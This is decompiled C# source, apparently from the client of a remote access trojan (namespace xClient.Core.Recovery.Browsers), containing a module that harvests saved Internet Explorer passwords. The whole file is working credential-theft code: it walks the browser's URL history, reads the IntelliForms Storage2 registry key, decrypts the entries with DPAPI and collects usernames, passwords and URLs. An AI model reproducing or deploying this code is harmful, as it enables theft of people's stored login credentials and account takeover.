using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace xClient.Core.Recovery.Browsers
{
	// Token: 0x020000BA RID: 186
	public static class InternetExplorer
	{
		// Token: 0x060004F0 RID: 1264 RVA: 0x000121A8 File Offset: 0x000103A8
		public static List<GClass32> GetSavedPasswords()
		{
			List<GClass32> list = new List<GClass32>();
			try
			{
				using (ExplorerUrlHistory explorerUrlHistory = new ExplorerUrlHistory())
				{
					List<string[]> list2 = new List<string[]>();
					foreach (STATURL staturl in explorerUrlHistory)
					{
						try
						{
							if (InternetExplorer.DecryptIePassword(staturl.UrlString, list2))
							{
								foreach (string[] array in list2)
								{
									list.Add(new GClass32
									{
										Username = array[0],
										Password = array[1],
										URL = staturl.UrlString,
										Application = "InternetExplorer"
									});
								}
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060004F1 RID: 1265 RVA: 0x000046B0 File Offset: 0x000028B0
		public static List<GClass32> GetSavedCookies()
		{
			return new List<GClass32>();
		}

		// Token: 0x060004F2 RID: 1266 RVA: 0x000122D4 File Offset: 0x000104D4
		private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
		{
			GCHandle gchandle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
			T result = (T)((object)Marshal.PtrToStructure(gchandle.AddrOfPinnedObject(), typeof(T)));
			gchandle.Free();
			return result;
		}

		// Token: 0x060004F3 RID: 1267 RVA: 0x00012310 File Offset: 0x00010510
		private static bool DecryptIePassword(string url, List<string[]> dataList)
		{
			string urlhashString = InternetExplorer.GetURLHashString(url);
			if (!InternetExplorer.DoesURLMatchWithHash(urlhashString))
			{
				return false;
			}
			byte[] encryptedData;
			using (RegistryKey registryKey = GClass9.smethod_1(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"))
			{
				if (registryKey == null)
				{
					return false;
				}
				encryptedData = (byte[])registryKey.GetValue(urlhashString);
			}
			byte[] array = new byte[2 * (url.Length + 1)];
			Buffer.BlockCopy(url.ToCharArray(), 0, array, 0, url.Length * 2);
			byte[] array2 = ProtectedData.Unprotect(encryptedData, array, DataProtectionScope.CurrentUser);
			InternetExplorer.IEAutoComplteSecretHeader ieautoComplteSecretHeader = InternetExplorer.ByteArrayToStructure<InternetExplorer.IEAutoComplteSecretHeader>(array2);
			if ((long)array2.Length >= (long)((ulong)(ieautoComplteSecretHeader.dwSize + ieautoComplteSecretHeader.dwSecretInfoSize + ieautoComplteSecretHeader.dwSecretSize)))
			{
				uint num = ieautoComplteSecretHeader.IESecretHeader.dwTotalSecrets / 2U;
				int num2 = Marshal.SizeOf(typeof(InternetExplorer.SecretEntry));
				byte[] array3 = new byte[ieautoComplteSecretHeader.dwSecretSize];
				int num3 = (int)(ieautoComplteSecretHeader.dwSize + ieautoComplteSecretHeader.dwSecretInfoSize);
				Buffer.BlockCopy(array2, num3, array3, 0, array3.Length);
				if (dataList == null)
				{
					dataList = new List<string[]>();
				}
				else
				{
					dataList.Clear();
				}
				num3 = Marshal.SizeOf(ieautoComplteSecretHeader);
				int num4 = 0;
				while ((long)num4 < (long)((ulong)num))
				{
					byte[] array4 = new byte[num2];
					Buffer.BlockCopy(array2, num3, array4, 0, array4.Length);
					InternetExplorer.SecretEntry secretEntry = InternetExplorer.ByteArrayToStructure<InternetExplorer.SecretEntry>(array4);
					string[] array5 = new string[3];
					byte[] array6 = new byte[secretEntry.dwLength * 2U];
					Buffer.BlockCopy(array3, (int)secretEntry.dwOffset, array6, 0, array6.Length);
					array5[0] = Encoding.Unicode.GetString(array6);
					num3 += num2;
					Buffer.BlockCopy(array2, num3, array4, 0, array4.Length);
					secretEntry = InternetExplorer.ByteArrayToStructure<InternetExplorer.SecretEntry>(array4);
					byte[] array7 = new byte[secretEntry.dwLength * 2U];
					Buffer.BlockCopy(array3, (int)secretEntry.dwOffset, array7, 0, array7.Length);
					array5[1] = Encoding.Unicode.GetString(array7);
					array5[2] = urlhashString;
					dataList.Add(array5);
					num3 += num2;
					num4++;
				}
			}
			return true;
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x00012528 File Offset: 0x00010728
		private static bool DoesURLMatchWithHash(string urlHash)
		{
			bool result = false;
			using (RegistryKey registryKey = GClass9.smethod_1(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"))
			{
				if (registryKey == null)
				{
					return false;
				}
				if (registryKey.GetValueNames().Any((string value) => value == urlHash))
				{
					result = true;
				}
			}
			return result;
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x000125A0 File Offset: 0x000107A0
		private static string GetURLHashString(string wstrURL)
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			InternetExplorer.CryptAcquireContext(out zero, string.Empty, string.Empty, 1U, 4026531840U);
			if (!InternetExplorer.CryptCreateHash(zero, InternetExplorer.ALG_ID.CALG_SHA1, IntPtr.Zero, 0U, ref zero2))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			byte[] bytes = Encoding.Unicode.GetBytes(wstrURL);
			StringBuilder stringBuilder = new StringBuilder(42);
			if (InternetExplorer.CryptHashData(zero2, bytes, (wstrURL.Length + 1) * 2, 0U))
			{
				uint num = 20U;
				byte[] array = new byte[20];
				if (!InternetExplorer.CryptGetHashParam(zero2, InternetExplorer.HashParameters.HP_HASHVAL, array, ref num, 0U))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error());
				}
				byte b = 0;
				stringBuilder.Length = 0;
				int num2 = 0;
				while ((long)num2 < (long)((ulong)num))
				{
					byte b2 = array[num2];
					b += b2;
					stringBuilder.AppendFormat("{0:X2}", b2);
					num2++;
				}
				stringBuilder.AppendFormat("{0:X2}", b);
				InternetExplorer.CryptDestroyHash(zero2);
			}
			InternetExplorer.CryptReleaseContext(zero, 0U);
			return stringBuilder.ToString();
		}

		// Token: 0x060004F6 RID: 1270
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

		// Token: 0x060004F7 RID: 1271
		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptCreateHash(IntPtr hProv, InternetExplorer.ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

		// Token: 0x060004F8 RID: 1272
		[DllImport("advapi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

		// Token: 0x060004F9 RID: 1273
		[DllImport("advapi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptDestroyHash(IntPtr hHash);

		// Token: 0x060004FA RID: 1274
		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptGetHashParam(IntPtr hHash, InternetExplorer.HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

		// Token: 0x060004FB RID: 1275
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

		// Token: 0x04000218 RID: 536
		private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

		// Token: 0x04000219 RID: 537
		private const uint PROV_RSA_FULL = 1U;

		// Token: 0x0400021A RID: 538
		private const uint CRYPT_VERIFYCONTEXT = 4026531840U;

		// Token: 0x0400021B RID: 539
		private const int ALG_CLASS_HASH = 32768;

		// Token: 0x0400021C RID: 540
		private const int ALG_SID_SHA1 = 4;

		// Token: 0x020000BB RID: 187
		private struct IESecretInfoHeader
		{
			// Token: 0x0400021D RID: 541
			public uint dwIdHeader;

			// Token: 0x0400021E RID: 542
			public uint dwSize;

			// Token: 0x0400021F RID: 543
			public uint dwTotalSecrets;

			// Token: 0x04000220 RID: 544
			public uint unknown;

			// Token: 0x04000221 RID: 545
			public uint id4;

			// Token: 0x04000222 RID: 546
			public uint unknownZero;
		}

		// Token: 0x020000BC RID: 188
		private struct IEAutoComplteSecretHeader
		{
			// Token: 0x04000223 RID: 547
			public uint dwSize;

			// Token: 0x04000224 RID: 548
			public uint dwSecretInfoSize;

			// Token: 0x04000225 RID: 549
			public uint dwSecretSize;

			// Token: 0x04000226 RID: 550
			public InternetExplorer.IESecretInfoHeader IESecretHeader;
		}

		// Token: 0x020000BD RID: 189
		[StructLayout(LayoutKind.Explicit)]
		private struct SecretEntry
		{
			// Token: 0x04000227 RID: 551
			[FieldOffset(0)]
			public uint dwOffset;

			// Token: 0x04000228 RID: 552
			[FieldOffset(4)]
			public byte SecretId;

			// Token: 0x04000229 RID: 553
			[FieldOffset(5)]
			public byte SecretId1;

			// Token: 0x0400022A RID: 554
			[FieldOffset(6)]
			public byte SecretId2;

			// Token: 0x0400022B RID: 555
			[FieldOffset(7)]
			public byte SecretId3;

			// Token: 0x0400022C RID: 556
			[FieldOffset(8)]
			public byte SecretId4;

			// Token: 0x0400022D RID: 557
			[FieldOffset(9)]
			public byte SecretId5;

			// Token: 0x0400022E RID: 558
			[FieldOffset(10)]
			public byte SecretId6;

			// Token: 0x0400022F RID: 559
			[FieldOffset(11)]
			public byte SecretId7;

			// Token: 0x04000230 RID: 560
			[FieldOffset(12)]
			public uint dwLength;
		}

		// Token: 0x020000BE RID: 190
		private enum ALG_ID
		{
			// Token: 0x04000232 RID: 562
			CALG_MD5 = 32771,
			// Token: 0x04000233 RID: 563
			CALG_SHA1
		}

		// Token: 0x020000BF RID: 191
		private enum HashParameters
		{
			// Token: 0x04000235 RID: 565
			HP_ALGID = 1,
			// Token: 0x04000236 RID: 566
			HP_HASHVAL,
			// Token: 0x04000237 RID: 567
			HP_HASHSIZE = 4
		}
	}
}
